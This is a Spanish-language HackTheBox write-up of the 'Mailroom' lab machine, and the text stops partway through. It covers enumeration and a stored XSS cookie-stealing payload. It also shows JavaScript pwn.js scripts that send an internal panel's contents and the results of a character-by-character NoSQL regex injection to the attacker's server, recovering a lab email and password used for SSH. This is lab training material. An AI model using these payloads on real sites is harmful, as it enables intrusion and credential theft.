---
layout: post
title: "HackTheBox - Mailroom (hard)"
categories: hackthebox/machines/hard
---
### **Enumeracion**
Uso esta funcion para aumentar la la rapidez de enumeracion.
{% highlight bash %}
Œª ubuntu-pc Busqueda ‚Üí which scan
scan () {
        target $1
        sudo nmap --min-rate 5000 -p- --privileged -sS -Pn -n -v $1 -oN nmap/all-tcp-ports.txt
        ports=$(cat nmap/all-tcp-ports.txt | grep -oP "\d+/tcp" | cut -d / -f 1 | tr "\n"  "," |sed 's/,$//g')
        sudo nmap -T4 -p$ports -A -Pn -n -v $1 -oN nmap/all-tcp-versions.txt
}
{% endhighlight %}

Nmap encuentra 2 puertos abiertos.
{% highlight sh %}
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: The Mail Room
{% endhighlight %}

Visitando la pagina, esta luce de esta forma.

![web](/assets/hackthebox/img/machines/hard/mailroom/web.png)

Algunos enlaces mandan a:
{% highlight sh %}
http://10.10.11.209/about.php
http://10.10.11.209/contact.php
http://10.10.11.209/index.php
http://10.10.11.209/services.php
{% endhighlight %}

El que llama mas la atencion es el formulario de contacto en `/contact.php`.

Hay una IA que ve nuestro mensaje.

Esto huele a XSS.

![contact](/assets/hackthebox/img/machines/hard/mailroom/contact.png)

Luego de enviar el formulario, aparece un link de nuestro mensaje.

![contact-sended](/assets/hackthebox/img/machines/hard/mailroom/contact-sended.png)

El link se ve asi.

Donde "hola, esto es una prueba" es lo que envie en el campo message, donde "l1nvx@l1nvx" es lo que envie en el campo email y "probando" es lo que envie en el campo title.

![contact-message](/assets/hackthebox/img/machines/hard/mailroom/contact-message.png)

### **XSS**

Enviando `<script>alert(1);</script>` en el campo message, obtenemos el alert.

![alert](/assets/hackthebox/img/machines/hard/mailroom/alert.png)

En este punto tratemos de robar alguna cookie, existe la posibilidad que esa IA tenga alguna una cookie de sesion la cual le permite acceder a alguna funcionalidad de la web para ver nuestro mensaje, que nosotros no tenemos.

Utilizo `<script>document.location="http://10.10.14.189:8000/?c=" + document.cookie</script>`.

Utilizar netcat revela algunos headers interesantes como el referer.

{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí nc -lnvp 8000
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.10.11.209.
Ncat: Connection from 10.10.11.209:33036.
GET /?c= HTTP/1.1
Host: 10.10.14.189:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
{% endhighlight %}

No hay cookies.

En este punto el XSS no nos sirve de mucho, fuzzeare archivos-directorios que existan en la web.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí feroxbuster -u http://10.10.11.209 -w ~/SecLists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.10.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.11.209
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /home/l1nvx/SecLists/Discovery/Web-Content/common.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ Random
 üîé  Extract Links         ‚îÇ true
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       86l      271w     4317c http://10.10.11.209/contact.php
200      GET     1345l     6662w    64933c http://10.10.11.209/font/bootstrap-icons.css
200      GET      320l     1728w   209928c http://10.10.11.209/assets/favicon.ico
200      GET      128l      534w     7748c http://10.10.11.209/index.php
200      GET       75l      321w     4336c http://10.10.11.209/services.php
200      GET      118l      394w     6891c http://10.10.11.209/about.php
200      GET    11300l    21361w   206710c http://10.10.11.209/css/styles.css
200      GET        7l     1031w    78135c http://10.10.11.209/js/bootstrap.bundle.min.js
200      GET      128l      534w     7748c http://10.10.11.209/
301      GET        9l       28w      313c http://10.10.11.209/assets => http://10.10.11.209/assets/
301      GET        9l       28w      310c http://10.10.11.209/css => http://10.10.11.209/css/
301      GET        9l       28w      311c http://10.10.11.209/font => http://10.10.11.209/font/
301      GET        9l       28w      316c http://10.10.11.209/inquiries => http://10.10.11.209/inquiries/
301      GET        9l       28w      317c http://10.10.11.209/javascript => http://10.10.11.209/javascript/
301      GET        9l       28w      309c http://10.10.11.209/js => http://10.10.11.209/js/
{% endhighlight %}

Nada interesante, fuzzeare subdominios, el problema esque no conozco el dominio de la web

En apache hay una forma para obtenerlo
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí curl --header "Host: *" --url http://10.10.11.209
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at mailroom.htb Port 80</address>
</body></html>
{% endhighlight %}
Nos lekea el dominio `mailroom.htb`.

Tambien estaba en la web.

![domain](/assets/hackthebox/img/machines/hard/mailroom/domain.png)

Utilizo ffuf para esto.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí ffuf -u http://10.10.11.209 -H "Host: FUZZ.mailroom.htb" -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 7748

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.209
 :: Wordlist         : FUZZ: /home/l1nvx/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : User-Agent: Mozilla/5.0 (Linux; Android 5.1; iris 600 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36
 :: Header           : Host: FUZZ.mailroom.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 7748
________________________________________________

[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 523ms]
| URL | http://10.10.11.209
    * FUZZ: git
{% endhighlight %}

Encontramos `git.mailroom.htb`, lo a√±adimos al nuestro /etc/hosts.

### **git.mailroom.htb**

Visitamos el subdominio y se esta ejecutando gitea.

![gitea](/assets/hackthebox/img/machines/hard/mailroom/gitea.png)

Encontramos un repositorio y un usuario.

![repo](/assets/hackthebox/img/machines/hard/mailroom/repo.png)

Es un proyecto web.

![repo-files](/assets/hackthebox/img/machines/hard/mailroom/repo-files.png)

Revisando los commits encontramos un subdominio nuevo.

![domain](/assets/hackthebox/img/machines/hard/mailroom/commit.png)

#### **staff-review-panel.mailroom.htb**

Despues de a√±adir el subdominio al /etc/hosts, lo visitamos y nos responde con `Forbidden`.

![forbidden](/assets/hackthebox/img/machines/hard/mailroom/forbidden.png)

Recordando el XSS veamos si nos responde el header `Access-Control-Allow-Origin` que utiliza `CORS` cuando un navegador envia una peticion desde un dominio o subdominio diferente al solicitado.

*Cuando un sitio intenta obtener contenido de otro sitio, el encabezado Access-Control-Allow-Origin especifica d√≥nde se puede acceder al contenido de una p√°gina*

{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí curl --url http://staff-review-panel.mailroom.htb --header "Origin: http://127.0.0.1" --header "Referer: http://127.0.0.1" --head
HTTP/1.1 403 Forbidden
Date: Mon, 14 Aug 2023 01:03:58 GMT
Server: Apache/2.4.54 (Debian)
Content-Type: text/html; charset=iso-8859-1
{% endhighlight %}
De todas formas no nos devuelve nada interesante, lo cual podemos sospechar que hay un control de acceso que comprueba la ip de origen (enviemos lo que enviemos nos devolvera Forbidden porque nuestra ip no esta permitida)

#### **Comprobacion de `CSP`**.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí curl --url http://10.10.11.209 --head
HTTP/1.1 200 OK
Date: Mon, 14 Aug 2023 00:40:22 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
{% endhighlight %}

*CSP*: *Enumera y describe rutas y fuentes, desde las cuales el navegador puede cargar recursos de manera segura.*

No esta definido el `Content-Security-policy` header, osea podemos ejecutar codigo javascript arbitrario utilizando el XSS.
### **CSRF - staff-review-panel.mailroom.htb**

Llamemos a un script de nuestro servidor.

`<script src="http://10.10.14.189:8000/enum/pwn.js"></script>`
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí curl --silent --request POST --data-raw "email=l1nvx%40l1nvx&title=l&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.189%3A8000%2Fenum%2Fpwn.js%22%3E%3C%2Fscript%3E" --url "http://10.10.11.209/contact.php" 1>/dev/null
{% endhighlight %}

Peticion en nuestro servidor.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.209 - - [13/Aug/2023 20:47:49] code 404, message File not found
10.10.11.209 - - [13/Aug/2023 20:47:49] "GET /enum/pwn.js HTTP/1.1" 404 -
{% endhighlight %}

Veamos si podemos obtener el contenido de `staff-review-panel.mailroom.htb`.

No pude hacer funcionar `fetch`, por alguna razon no funciona, utilizare XMLHttpRequest.

`pwn.js`
{% highlight javascript %}
const l1nvx = "http://10.10.14.189:8000";
const url = "http://staff-review-panel.mailroom.htb";

function main() {
    try {
        const req = new XMLHttpRequest();
        req.onreadystatechange = () => {
            if (req.readyState === XMLHttpRequest.DONE) {
                // Enviar el contenido
                const req_ = new XMLHttpRequest();
                req_.open("GET", `${l1nvx}/?data=${encodeURIComponent(req.responseText)}`, false);
                req_.send();
            }
        }
        req.open("GET", url, false);
        req.send();
    } catch (error) {
        // Enviar error
        const req = new XMLHttpRequest();
        req.open("GET", `${l1nvx}/?error=${encodeURIComponent(error)}`, false);
        req.send();
    }
}
main();
{% endhighlight %}

Obtenemos el contenido.

{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 20:57:05] "GET /?data=%0A%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22utf-8%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20shrink-to-fit%3Dno%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22%22%20%2F%3E%0A%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0A%20%20%3Ctitle%3EInquiry%20Review%20Panel%3C%2Ftitle%3E%0A%20%20%3C!--%20Favicon--%3E%0A%20%20%3Clink%20rel%3D%22icon%22%20type%3D%22image%2Fx-icon%22%20href%3D%22assets%2Ffavicon.ico%22%20%2F%3E%0A%20%20%3C!--%20Bootstrap%20icons--%3E%0A%20%20%3Clink%20href%3D%22font%2Fbootstrap-icons.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0A%20%20%3C!--%20Core%20theme%20CSS%20(includes%20Bootstrap)--%3E%0A%20%20%3Clink%20href%3D%22css%2Fstyles.css%22%20rel%3D%22stylesheet%22%20%2F%3E%0A%3C%2Fhead%3E%0A%0A%3Cbody%3E%0A%20%20%3Cdiv%20class%3D%22wrapper%20fadeInDown%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22formContent%22%3E%0A%0A%20%20%20%20%20%20%3C!--%20Login%20Form%20--%3E%0A%20%20%20%20%20%20%3Cform%20id%3D%27login-form%27%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%3Ch2%3EPanel%20Login%3C%2Fh2%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22text%22%20id%3D%22email%22%20class%3D%22fadeIn%20second%22%20name%3D%22email%22%20placeholder%3D%22Email%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22password%22%20id%3D%22password%22%20class%3D%22fadeIn%20third%22%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20class%3D%22fadeIn%20fourth%22%20value%3D%22Log%20In%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%20hidden%20id%3D%22message%22%20style%3D%22color%3A%20%238F8F8F%22%3EOnly%20show%20this%20line%20if%20response%20-%20edit%20code%3C%2Fp%3E%0A%20%20%20%20%20%20%3C%2Fform%3E%0A%0A%20%20%20%20%20%20%3C!--%20Remind%20Passowrd%20--%3E%0A%20%20%20%20%20%20%3Cdiv%20id%3D%22formFooter%22%3E%0A%20%20%20%20%20%20%20%20%3Ca%20class%3D%22underlineHover%22%20href%3D%22register.html%22%3ECreate%20an%20account%3C%2Fa%3E%0A%20%20%20%20%20%20%3C%2Fdiv%3E%0A%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fdiv%3E%0A%0A%20%20%3C!--%20Bootstrap%20core%20JS--%3E%0A%20%20%3Cscript%20src%3D%22js%2Fbootstrap.bundle.min.js%22%3E%3C%2Fscript%3E%0A%0A%20%20%3C!--%20Login%20Form--%3E%0A%20%20%3Cscript%3E%0A%20%20%20%20%2F%2F%20Get%20the%20form%20element%0A%20%20%20%20const%20form%20%3D%20document.getElementById(%27login-form%27)%3B%0A%0A%20%20%20%20%2F%2F%20Add%20a%20submit%20event%20listener%20to%20the%20form%0A%20%20%20%20form.addEventListener(%27submit%27%2C%20event%20%3D%3E%20%7B%0A%20%20%20%20%20%20%2F%2F%20Prevent%20the%20default%20form%20submission%0A%20%20%20%20%20%20event.preventDefault()%3B%0A%0A%20%20%20%20%20%20%2F%2F%20Send%20a%20POST%20request%20to%20the%20login.php%20script%0A%20%20%20%20%20%20fetch(%27%2Fauth.php%27%2C%20%7B%0A%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20body%3A%20new%20URLSearchParams(new%20FormData(form))%2C%0A%20%20%20%20%20%20%20%20headers%3A%20%7B%20%27Content-Type%27%3A%20%27application%2Fx-www-form-urlencoded%27%20%7D%0A%20%20%20%20%20%20%7D).then(response%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20return%20response.json()%3B%0A%0A%20%20%20%20%20%20%7D).then(data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Display%20the%20name%20and%20message%20in%20the%20page%0A%20%20%20%20%20%20%20%20document.getElementById(%27message%27).textContent%20%3D%20data.message%3B%0A%20%20%20%20%20%20%20%20document.getElementById(%27password%27).value%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20document.getElementById(%27message%27).removeAttribute(%22hidden%22)%3B%0A%20%20%20%20%20%20%7D).catch(error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20Display%20an%20error%20message%0A%20%20%20%20%20%20%20%20%2F%2Falert(%27Error%3A%20%27%20%2B%20error)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E HTTP/1.1" 200 -
{% endhighlight %}

Al decodificar y verlo desde firefox.

![login](/assets/hackthebox/img/machines/hard/mailroom/login.png)

En este punto podemos entonces realizar peticiones a ese subdominio.

Volviendo al repositorio donde encontramos el subdominio confirmamos que el codigo corresponde al archivo `index.php`, entonces confirmamos que el repositorio es el codigo del subdominio `staff-review-panel.mailroom.htb`.

### **Analisis de codigo**

El formulario envia una peticion a `auth.php`.

`index.php`
{% highlight html %}
fetch('/auth.php', {
        method: 'POST',
        body: new URLSearchParams(new FormData(form)),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).then(response => {
        return response.json();

      }).then(data => {
        // Display the name and message in the page
        document.getElementById('message').textContent = data.message;
        document.getElementById('password').value = '';
        document.getElementById('message').removeAttribute("hidden");
      }).catch(error => {
        // Display an error message
        //alert('Error: ' + error);
      });
{% endhighlight %}

`auth.php` contiene el codigo que maneja el inicio de sesion.

Utiliza una base de datos Mongo.
{% highlight php %}
$client = new MongoDB\Client("mongodb://mongodb:27017");
{% endhighlight %}

Obtiene todos los usuarios registrados.
{% highlight php %}
$collection = $client->backend_panel->users;
{% endhighlight %}

Verifica si existe email, password por el metodo POST, que sean de tipo string, luego guarda en la variable $user el valor que retorne la base de datos si email, password existen.

El problema aqui esque no utiliza die() o exit para finalizar con la ejecucion del codigo y la conexion, despues de enviar el header de estado `'HTTP/1.1 401 Unauthorized`.

Osea podemos enviar arrays y el codigo continuaria procesando nuestra solicitud.

Esto nos permite realizar consultas como `email[]=notexists&password[]=notexists` o aprovechandonos de Nosql injection `email[$ne]=notexists&password[$ne]=notexists`
{% highlight php %}
if (isset($_POST['email']) && isset($_POST['password'])) {
    if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
    }

    // Check if the email and password are correct
    $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);

      if ($user) {
[...cortado...]
{% endhighlight %}

Si el email y password son validos(existen en la base de datos), envia un token al email, el cual utiliza como mecanismo de autenticacion.

Si logramos obtener las credenciales de algun usuario valido de todas formas no podremos autenticarnos en la web.

Si leemos /var/mail/{user} y obtenemos el token ah√≠ si podremos autenticarnos.
{% highlight php %}
echo json_encode(['success' => true, 'message' => 'Check your inbox for an email with your 2FA token']);
    exit;

  } else {
    // Return a JSON error response
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid email or password']);
  }
{% endhighlight %}
### **CSRF - NOSQL injection**

Confirmamos si nos devuelve "Check your inbox for an email with your 2FA token".

`pwn.js`
{% highlight javascript %}
const l1nvx = "http://10.10.14.189:8000";
const url = "http://staff-review-panel.mailroom.htb";

function main() {
    try {
        const req = new XMLHttpRequest();
        // NOSQL
        const body = `email[$ne]=notexists&password[$ne]=notexists`;
        req.onreadystatechange = () => {
            if (req.readyState === XMLHttpRequest.DONE) {
                // Enviar el contenido
                const req_ = new XMLHttpRequest();
                req_.open("GET", `${l1nvx}/?data=${encodeURIComponent(req.responseText)}`, false);
                req_.send();
            }
        }
        req.open("POST", `${url}/auth.php`, false);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.send(body);
    } catch (error) {
        // Enviar error
        const req = new XMLHttpRequest();
        req.open("GET", `${l1nvx}/?error=${encodeURIComponent(error)}`, false);
        req.send();
    }
}
main();
{% endhighlight %}

Nos devuelve decodificado:

{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 21:44:25] "GET /?data=%7B%22success%22%3Afalse%2C%22message%22%3A%22Invalid%20input%20detected%22%7D%7B%22success%22%3Atrue%2C%22message%22%3A%22Check%20your%20inbox%20for%20an%20email%20with%20your%202FA%20token%22%7D HTTP/1.1" 200 -
{% endhighlight %}

NOSQL Injection es valido.


El siguiente script funciona hasta cierto tiempo, el usuario no alcanza a recorrer toda la string de caracteres, por lo que obtener todo el email no seria posible de un solo tiro, habra que ir acortando la string de caracteres.

Por alguna razon no logre hacer funcionar `fetch` ni funciones `async`.

Recorre cada caracter y por cada caracter envia una peticion `nosql - regex` al subdominio y el resultado lo envia a nuestro servidor.

`pwn.js`
{% highlight javascript %}
const l1nvx = "http://10.10.14.189:8000";
const url = "http://staff-review-panel.mailroom.htb";
function main() {
    try {
        const chars = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~`;
        for (const char of chars) {
            nosql(`${char}`);
        }
    } catch (error) {
        const req = new XMLHttpRequest();
        req.open("GET", `${l1nvx}/?error=${encodeURIComponent(error)}`, false);
        req.send();
    }
}
function nosql(char) {
    const req = new XMLHttpRequest();
    const req_ = new XMLHttpRequest();
    const know = "";
    const payload = encodeURIComponent(`${know}${char}`);
    const body = `email[$regex]=^${payload}&password[$ne]=l1nvx`;
    let status;
    req.onreadystatechange = () => {
        if (req.readyState === XMLHttpRequest.DONE) {
            if (req.responseText.includes("true")) {
                status = "true";
            } else {
                status = "false";
            }
            req_.open("GET", `${l1nvx}/?char=${char}&status=${status}`, false);
            req_.send();
        }
    }
    req.open("POST", `${url}/auth.php`, false);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send(body);

}
main();
{% endhighlight %}

#### **Nosql - Exfil (email)**

La primera letra del campo email es `t`.
{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 16:29:21] "GET /?char=t&status=true HTTP/1.1" 200 -
{% endhighlight %}

Modificamos "know" para a√±adir la letra `t`
`pwn.js`
{% highlight javascript %}
const know = "t";
{% endhighlight %}
Ahora obtenemos esta salida en nuestro servidor web.

Eliminamos la string de caracteres desde 0-q porque ninguno coincide con el segundo caracter del email.

{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 16:54:32] "GET /?char=t0&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:32] "GET /?char=t1&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:33] "GET /?char=t2&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:34] "GET /?char=t3&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:35] "GET /?char=t4&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:36] "GET /?char=t5&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:37] "GET /?char=t6&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:37] "GET /?char=t7&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:38] "GET /?char=t8&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:38] "GET /?char=t9&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:39] "GET /?char=ta&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:40] "GET /?char=tb&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:41] "GET /?char=tc&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:42] "GET /?char=td&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:42] "GET /?char=te&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:43] "GET /?char=tf&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:44] "GET /?char=tg&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:44] "GET /?char=th&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:45] "GET /?char=ti&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:46] "GET /?char=tj&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:47] "GET /?char=tk&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:48] "GET /?char=tl&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:49] "GET /?char=tm&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:49] "GET /?char=tn&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:51] "GET /?char=to&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:51] "GET /?char=tp&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 16:54:52] "GET /?char=tq&status=false HTTP/1.1" 200 -
{% endhighlight %}

`pwn.js`
{% highlight javascript %}
const chars = `rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'`;
{% endhighlight %}

El segundo caracter del campo email es `r`.

{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 17:01:38] "GET /?char=tr&status=true HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 17:01:39] "GET /?char=ts&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 17:01:40] "GET /?char=tt&status=false HTTP/1.1" 200 -
10.10.11.209 - - [13/Aug/2023 17:01:41] "GET /?char=tu&status=false HTTP/1.1" 200 -
{% endhighlight %}

Seguimos asi consecutivamente y obtendremos el valor del campo email `tristan@mailroom.htb`.

#### **Nosql - Exfil (password)**

Despues de descubrir el campo email, tratemos de obtener su contrase√±a.

Solo hacemos esta modificacion (ademas de ir a√±adiendo y eliminando caracteres de la string `chars` y `know` posteriormente).

`pwn.js`
{% highlight javascript %}
const know = "";
const body = `email=tristan@mailroom.htb&password[$regex]=^${payload}`;
{% endhighlight %}

Primer caracter `6`.
{% highlight sh %}
10.10.11.209 - - [13/Aug/2023 17:10:44] "GET /?char=6&status=true HTTP/1.1" 200 -
{% endhighlight %}

Seguimos a√±adiendo cada caracter que nos devuelva true y finalmente obtenemos. `69trisRulez!`

Iniciar sesion en `git.mailroom.htb` nos devuelve un codigo de estado 500.

![500](/assets/hackthebox/img/machines/hard/mailroom/gitea-500.png)

Introduciendo una diferente contrase√±a nos devuelve.

![gitea-password](/assets/hackthebox/img/machines/hard/mailroom/gitea-password.png)

Podemos autenticarnos en ssh.
{% highlight sh %}
Œª ubuntu-pc Mailroom ‚Üí sshpass -p '69trisRulez!' ssh tristan@mailroom.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 14 Aug 2023 02:00:23 AM UTC
[...cortado...]
{% endhighlight %}
#### **User.txt**

Podemos ver el `Access-Control-Allow-Origin` header que me permite mostrar su contenido, una vez dentro de la maquina.
{% highlight sh %}
tristan@mailroom:~$ curl --head --url http://staff-review-panel.mailroom.htb
HTTP/1.1 200 OK
Date: Mon, 14 Aug 2023 04:10:51 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=a77db7dd220c93adfb62a87006c52a58; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=UTF-8
{% endhighlight %}

Leyendo nuestro correo, vemos el token para autenticarnos.
{% highlight sh %}
tristan@mailroom:~$ cat /var/mail/tristan
Return-Path: <noreply@mailroom.htb>
